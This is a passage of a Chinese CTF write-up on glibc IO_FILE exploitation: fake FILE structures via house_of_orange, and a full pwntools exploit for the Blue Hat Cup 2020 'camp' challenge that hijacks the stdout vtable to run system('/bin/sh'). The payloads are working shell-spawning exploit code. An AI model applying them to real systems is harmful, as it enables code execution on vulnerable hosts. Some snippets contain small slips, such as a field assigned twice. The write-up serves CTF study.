  <span class="token function">__libc_cleanup_region_end</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property">#<span class="token directive keyword">endif</span></span>

  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>根据源码，我们能得出，要执行<code>_IO_OVERFLOW</code>函数，需要满足以下两种条件中的一种</p>
<pre class=" language-c"><code class="language-c">fp<span class="token operator">-></span>_mode <span class="token operator">&lt;=</span> <span class="token number">0</span> 
<span class="token operator">&amp;&amp;</span> fp<span class="token operator">-></span>_IO_write_ptr <span class="token operator">></span> fp<span class="token operator">-></span>_IO_write_base</code></pre>
<p>或者</p>
<pre class=" language-c"><code class="language-c"><span class="token function">_IO_vtable_offset</span> <span class="token punctuation">(</span>fp<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token comment" spellcheck="true">//# define _IO_vtable_offset(THIS) (THIS)->_vtable_offset</span>
<span class="token operator">&amp;&amp;</span> fp<span class="token operator">-></span>_mode <span class="token operator">></span> <span class="token number">0</span>
<span class="token operator">&amp;&amp;</span> fp<span class="token operator">-></span>_wide_data<span class="token operator">-></span>_IO_write_ptr<span class="token operator">></span> fp<span class="token operator">-></span>_wide_data<span class="token operator">-></span>_IO_write_base</code></pre>
<p>很明显，第一种条件要比第二种更容易满足，条件二除了当前FILE结构体，还涉及到一个<code>_wide_data</code>结构体，在此不作讨论，仅讨论第一种情况下的利用实现</p>
<p>在<code>_IO_flush_all_lockp</code>源码中，我们看到<code>_IO_OVERFLOW</code>函数的第一个参数是从<code>_IO_list_all</code>开始的一系列<code>_IO_FILE</code>结构体，<code>_IO_flush_all_lockp</code>会从<code>_IO_list_all</code>开始沿着<code>_chian</code>寻找到下一个<code>IO_FILE</code>并刷新。一般情况下<code>_IO_list_all</code>的值是<code>_IO_2_1_stderr</code>的指针，如果我们能够将<code>_IO_list_all</code>的值修改为我们可控的区域的地址，然后在该区域伪造一个FILE结构体，按照if条件设置好对应的值，将<code>_IO_OVERFLOW</code>设置为<code>system</code>函数的地址，这样当我们触发<code>malloc_printerr</code>时便会沿着调用链一路执行，最终执行<code>system("/bin/sh")</code>。</p>
<p>手动构造FILE结构体比较麻烦，推荐[veritas501]([<a href="https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#more]" target="_blank" rel="noopener">https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#more]</a>(<a href="https://veritas501.space/2017/12/13/IO" target="_blank" rel="noopener">https://veritas501.space/2017/12/13/IO</a> FILE 学习笔记/#more))师傅写的FILE结构体伪造模块，或者raycp师傅的<a href="https://github.com/ray-cp/pwn_debug" target="_blank" rel="noopener">pwn_debug</a>项目，也有对应的FILE结构体伪造模块</p>
<p>通过两个例题加深对IO_FILE伪造的理解</p>
<h3 id="0x1-house-of-orange"><a href="#0x1-house-of-orange" class="headerlink" title="0x1.house_of_orange"></a>0x1.house_of_orange</h3><p>完整过程就不说了，重点在于伪造FILE结构体</p>
<p>程序存在堆溢出，并且最大可申请0x1000的chunk，先利用堆溢出修改topchunk的大小，再申请一个大于topchunk大小的chunk，将topchunk放入unsortedbin(操作原理就不说了，可以去看看别的师傅的讲解)，再申请一个largebin大小的chunk就可以分别泄露出libc地址和heap地址了。接下来就是最关键的操作，将unsortedbin的size修改为0x61，并且直接将unsortedbin伪造为一个FILE结构体</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#借助pwn_debug进行FILE结构体构造</span>
payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x400</span> <span class="token comment" spellcheck="true">#largebin</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#orange结构体在用户申请的chunk下方，大小为0x20</span>
payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x1f</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#orange结构体有两个值，一个为price，一个为color，分别占4字节</span>
fake_file <span class="token operator">=</span> IO_FILE_plus<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#创建一个IO_FILE对象</span>
fake_file<span class="token punctuation">.</span>_flags <span class="token operator">=</span> u64<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#设置_flag为binsh，_flag的位置为unsorted bin的presize</span>
fake_file<span class="token punctuation">.</span>_IO_read_ptr <span class="token operator">=</span> <span class="token number">0x61</span><span class="token comment" spellcheck="true">#修改unsorted bin的size为0x61</span>
fake_file<span class="token punctuation">.</span>_IO_read_base<span class="token operator">=</span>_IO_list_all<span class="token number">-0x10</span><span class="token comment" spellcheck="true">#修改unsorted bin的bk指针为_IO_list_all-0x10</span>
fake_file<span class="token punctuation">.</span>_IO_write_ptr<span class="token operator">=</span><span class="token number">0</span>
fake_file<span class="token punctuation">.</span>_IO_write_ptr<span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">#满足_IO_write_ptr > _IO_write_ptr</span>
fake_file<span class="token punctuation">.</span>_mode<span class="token operator">=</span><span class="token number">0</span><span class="token comment" spellcheck="true">#满足_mode&lt;=0</span>
fake_file<span class="token punctuation">.</span>vtable<span class="token operator">=</span>heap_base<span class="token operator">+</span><span class="token number">0x4f0</span><span class="token operator">+</span>fake_file<span class="token punctuation">.</span>size<span class="token comment" spellcheck="true">#设置vtable指向fake_file下方</span>
pay <span class="token operator">+=</span> str<span class="token punctuation">(</span>fake_file<span class="token punctuation">)</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>  <span class="token comment" spellcheck="true"># vtable，_IO_OVERFLOW在_IO_jump_t中的偏移为0x18</span>
pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 设置_IO_OVERFLOW为system，</span>

upgrade<span class="token punctuation">(</span><span class="token number">0x800</span><span class="token punctuation">,</span> pay<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span></code></pre>
<p>解释一下这一段，将unsorted bin的bk指针设置为_IO_list_all-0x10，这样当我们申请chunk时便会触发unsorted bin attack</p>
<pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">/* remove from unsorted list */</span>
<span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-></span>bk <span class="token operator">=</span> bck<span class="token punctuation">;</span>
bck<span class="token operator">-></span>fd <span class="token operator">=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>结果便是将main_arena+88写入<code>_IO_list_all</code>，则<code>_IO_list_all</code>指向了main_arena+88，因为我们将unsorted bin的size修改为0x61，这个unsorted bin会被放入大小为0x60的small bin中，0x60的smallbin地址的存储位置相对于main_arena+88为0x68，而chain在FILE结构体中的偏移也为0x68。顺便附上结构体的偏移量</p>
<pre class=" language-c"><code class="language-c"><span class="token number">0x0</span>   _flags
<span class="token number">0x8</span>   _IO_read_ptr
<span class="token number">0x10</span>  _IO_read_end
<span class="token number">0x18</span>  _IO_read_base
<span class="token number">0x20</span>  _IO_write_base
<span class="token number">0x28</span>  _IO_write_ptr
<span class="token number">0x30</span>  _IO_write_end
<span class="token number">0x38</span>  _IO_buf_base
<span class="token number">0x40</span>  _IO_buf_end
<span class="token number">0x48</span>  _IO_save_base
<span class="token number">0x50</span>  _IO_backup_base
<span class="token number">0x58</span>  _IO_save_end
<span class="token number">0x60</span>  _markers
<span class="token number">0x68</span>  _chain
<span class="token number">0x70</span>  _fileno
<span class="token number">0x74</span>  _flags2
<span class="token number">0x78</span>  _old_offset
<span class="token number">0x80</span>  _cur_column
<span class="token number">0x82</span>  _vtable_offset
<span class="token number">0x83</span>  _shortbuf
<span class="token number">0x88</span>  _lock
<span class="token number">0x90</span>  _offset
<span class="token number">0x98</span>  _codecvt
<span class="token number">0xa0</span>  _wide_data
<span class="token number">0xa8</span>  _freeres_list
<span class="token number">0xb0</span>  _freeres_buf
<span class="token number">0xb8</span>  __pad5
<span class="token number">0xc0</span>  _mode
<span class="token number">0xc4</span>  _unused2
<span class="token number">0xd8</span>  vtable</code></pre>
<p>又由于unsortedbin attack的缘故，会触发如下代码</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>victim <span class="token operator">=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token operator">-></span>bk<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">unsorted_chunks</span> <span class="token punctuation">(</span>av<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
          bck <span class="token operator">=</span> victim<span class="token operator">-></span>bk<span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>victim<span class="token operator">-></span>size <span class="token operator">&lt;=</span> <span class="token number">2</span> <span class="token operator">*</span> SIZE_SZ<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
              <span class="token operator">||</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>victim<span class="token operator">-></span>size <span class="token operator">></span> av<span class="token operator">-></span>system_mem<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> <span class="token string">"malloc(): memory corruption"</span><span class="token punctuation">,</span>
                             <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">,</span> av<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>malloc会出错，这样就会调用malloc_printerr函数，触发<code>_IO_flush_all_lockp</code>，通过IO_list_all找到找到main_arena+88,再通过chian找到我们伪造的FILE结构体，然后找到vtable，触发<code>_IO_OVERFLOW</code>，执行system(“/bin/sh”)</p>
<h3 id="0x2-蓝帽杯2020-camp"><a href="#0x2-蓝帽杯2020-camp" class="headerlink" title="0x2.蓝帽杯2020 camp"></a>0x2.蓝帽杯2020 camp</h3><p>libc2.23，保护全开</p>
<p><img src="/LawlietLW.github.io/2020/08/08/io-file-xue-xi/1.jpg" alt=""></p>
<p>菜单题</p>
<p><img src="/LawlietLW.github.io/2020/08/08/io-file-xue-xi/2.jpg" alt=""></p>
<p>看到第一个功能stdout</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">out</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
  <span class="token keyword">int</span> nbytes<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+4h] [rbp-1Ch]</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-10h]</span>
  <span class="token keyword">unsigned</span> __int64 v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+18h] [rbp-8h]</span>

  v4 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"size:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  nbytes <span class="token operator">=</span> <span class="token function">sub_C31</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> nbytes <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> nbytes <span class="token operator">></span> <span class="token number">0xF0</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"error."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"content:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  buf <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">strcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_202040 <span class="token operator">+</span> <span class="token number">24</span> <span class="token operator">*</span> chunk_num<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"stdout"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_202040 <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> chunk_num<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">=</span> nbytes<span class="token punctuation">;</span>
  v0 <span class="token operator">=</span> chunk_num<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>unk_202040 <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> v0 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> buf<span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Finish."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v4<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>malloc一个chunk，往chunk里写东西，再将chunk里的数据memcpy到<code>_IO_2_1_stdout_</code>结构体中</p>
<p>剩下的stdin和stderr功能也都和stdout一样，只不过将<code>_IO_2_1_stdout_</code>换成了<code>_IO_2_1_stdin_</code>和<code>_IO_2_1_stderr_</code></p>
<p>log功能就是打印出所有的chunk的内容，clear就是free掉所有chunk并将指针清零</p>
<p>一开始没找到漏洞点，后来看到了stdout、stdin和stderr，想起来利用_IO_FILE</p>
<p>开始利用</p>
<p>首先泄露libc地址，既然能直接往<code>_IO_2_1_stdout_</code>上写数据，那就直接利用<code>_IO_2_1_stdout_</code>泄露libc地址。然后修改stdout的vtable指针指向stdout，将stderr构造成vtable,之后由于会调用printf，printf的调用栈为</p>
<pre class=" language-c"><code class="language-c">vfprintf<span class="token operator">+</span><span class="token number">11</span>
_IO_file_xsputn
_IO_file_overflow
funlockfilec
_IO_file_write
write</code></pre>
<p>这里引用ctfwiki上的说明</p>
<pre><code>printf和puts是常用的输出函数，在printf的参数是以'\n'结束的纯字符串时，printf会被优化为puts函数并去除换行符。
puts在源码中实现的函数是_IO_puts，这个函数的操作与fwrite的流程大致相同，函数内部同样会调用vtable中的_IO_sputn，结果会执行_IO_new_file_xsputn，最后会调用到系统接口write函数。</code></pre><p>因为在vtable中有</p>
<pre class=" language-c"><code class="language-c"><span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_xsputn_t<span class="token punctuation">,</span> __xsputn<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>而</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)</span></code></pre>
<p>看到<code>_IO_puts</code>函数</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span>
<span class="token function">_IO_puts</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> result <span class="token operator">=</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>
  _IO_size_t len <span class="token operator">=</span> <span class="token function">strlen</span> <span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">_IO_acquire_lock</span> <span class="token punctuation">(</span>_IO_stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">_IO_vtable_offset</span> <span class="token punctuation">(</span>_IO_stdout<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span>
       <span class="token operator">||</span> <span class="token function">_IO_fwide</span> <span class="token punctuation">(</span>_IO_stdout<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
      <span class="token operator">&amp;&amp;</span> <span class="token function">_IO_sputn</span> <span class="token punctuation">(</span>_IO_stdout<span class="token punctuation">,</span> str<span class="token punctuation">,</span> len<span class="token punctuation">)</span> <span class="token operator">==</span> len
      <span class="token operator">&amp;&amp;</span> <span class="token function">_IO_putc_unlocked</span> <span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> _IO_stdout<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
    result <span class="token operator">=</span> <span class="token function">MIN</span> <span class="token punctuation">(</span>INT_MAX<span class="token punctuation">,</span> len <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">_IO_release_lock</span> <span class="token punctuation">(</span>_IO_stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>其中调用了<code>_IO_sputn</code>，第一个参数为<code>_IO_stdout</code>，找到<code>_IO_stdout</code>定义如下</p>
<pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> _IO_stdout ((_IO_FILE*)(&amp;_IO_2_1_stdout_))</span></code></pre>
<p>所以，第一个参数就为<code>_IO_2_1_stdout_</code>结构体，如果我们能将vtable中的<code>_IO_sputn</code>覆盖成system函数，将<code>_IO_2_1_stdout_</code>结构体的<code>_flags</code>覆盖成/bin/sh，这样就能调用system(“/bin/sh”)</p>
<p>完整exp如下</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
context<span class="token punctuation">.</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span>
io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./camp'</span><span class="token punctuation">)</span>
elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'camp'</span><span class="token punctuation">)</span>
libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">stdout</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>>'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'size:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">stdin</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>>'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'size:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">stderr</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>>'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'size:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'content:'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>>'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'>>>'</span><span class="token punctuation">)</span>
    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'5'</span><span class="token punctuation">)</span>


payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#修改_IO_2_1_stdout_结构体，泄露libc地址</span>
stdout<span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>

libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x3c36e0</span>
system_addr <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
_IO_2_1_stderr_ <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stderr_'</span><span class="token punctuation">]</span>
_IO_2_1_stdin_<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span>
_IO_2_1_stdout_<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">]</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'_IO_2_1_stderr_ => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>_IO_2_1_stderr_<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'_IO_2_1_stdin_ => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>_IO_2_1_stdin_<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'_IO_2_1_stdout_ => {}'</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>_IO_2_1_stdout_<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
payload<span class="token operator">=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">7</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#将stderr结构体伪造成vtable，前7个函数全部置0，第八个，也就是_IO_xsputn函数设置为system</span>
stderr<span class="token punctuation">(</span>len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>

payload<span class="token operator">=</span><span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span><span class="token number">0x3c56a3</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">7</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span><span class="token number">0x3c56a4</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span>
payload<span class="token operator">+=</span>p64<span class="token punctuation">(</span>_IO_2_1_stdin_<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xa000000</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc_base<span class="token operator">+</span><span class="token number">0x3c6780</span><span class="token punctuation">)</span>
